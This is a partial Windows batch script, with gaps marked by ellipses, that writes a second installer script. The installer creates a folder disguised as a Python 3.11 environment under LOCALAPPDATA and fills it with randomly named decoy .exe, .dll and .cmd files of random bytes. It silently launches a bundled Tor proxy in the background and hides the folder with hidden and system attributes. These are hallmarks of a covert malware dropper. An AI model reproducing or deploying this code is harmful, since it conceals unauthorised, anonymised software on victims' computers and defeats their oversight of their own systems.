...
set "VENV=%LOCALAPPDATA%\python-v.3.11.0\.venv"
...
echo :: =============================== >> "%INSC_BAT%"
echo set "BASE=%%LOCALAPPDATA%%\python-v.3.11.0\lib" >> "%INSC_BAT%"
...
echo set "VENV=%%LOCALAPPDATA%%\python-v.3.11.0\.venv" >> "%INSC_BAT%"
echo. >> "%INSC_BAT%"
echo :: =============================== >> "%INSC_BAT%"
...
echo ) else ( >> "%INSC_BAT%"
echo     for /L %%%%A in (1,1,25) do powershell -NoProfile -ExecutionPolicy Bypass -Command "$r=[guid]::NewGuid().ToString('N'); New-Item \"$env:LOCALAPPDATA\python-v.3.11.0\.venv\$r.mpy\" -ItemType File" >> "%INSC_BAT%"
echo     for /L %%%%A in (1,1,25) do powershell -NoProfile -ExecutionPolicy Bypass -Command "$r=[guid]::NewGuid().ToString('N'); $bytes = New-Object Byte[] 3070; (New-Object Random).NextBytes($bytes); [IO.File]::WriteAllBytes(\"$env:LOCALAPPDATA\python-v.3.11.0\.venv\$r.cmd\", $bytes)" >> "%INSC_BAT%"
echo     for /L %%%%A in (1,1,3) do powershell -NoProfile -ExecutionPolicy Bypass -Command "$r=[guid]::NewGuid().ToString('N'); $bytes = New-Object Byte[] 6161408; (New-Object Random).NextBytes($bytes); [IO.File]::WriteAllBytes(\"$env:LOCALAPPDATA\python-v.3.11.0\.venv\$r.exe\", $bytes)" >> "%INSC_BAT%"
echo     for /L %%%%A in (1,1,4) do powershell -NoProfile -ExecutionPolicy Bypass -Command "$r=[guid]::NewGuid().ToString('N'); $bytes = New-Object Byte[] 6074240; (New-Object Random).NextBytes($bytes); [IO.File]::WriteAllBytes(\"$env:LOCALAPPDATA\python-v.3.11.0\.venv\$r.dll\", $bytes)" >> "%INSC_BAT%"
echo ) >> "%INSC_BAT%"
echo. >> "%INSC_BAT%"
echo :: =============================== >> "%INSC_BAT%"
...
echo     echo start /b %%LOCALAPPDATA%%/python-v.3.11.0/lib/tor/tor/tor.exe -f %%LOCALAPPDATA%%/python-v.3.11.0/lib/tor/torrc >> "%INSC_BAT%"
...
echo echo [CMD] Start Tor Proxy: %%LOCALAPPDATA%%\python-v.3.11.0\lib\tor\Start-Tor-Proxy.cmd >> "%INSC_BAT%"
...
echo. >> "%INSC_BAT%"
echo start "" /B %%LOCALAPPDATA%%/python-v.3.11.0/lib/tor/tor/tor.exe -f %%LOCALAPPDATA%%/python-v.3.11.0/lib/tor/torrc >> "%INSC_BAT%"
...
echo attrib +h +s "%%LOCALAPPDATA%%\python-v.3.11.0" >> "%INSC_BAT%"
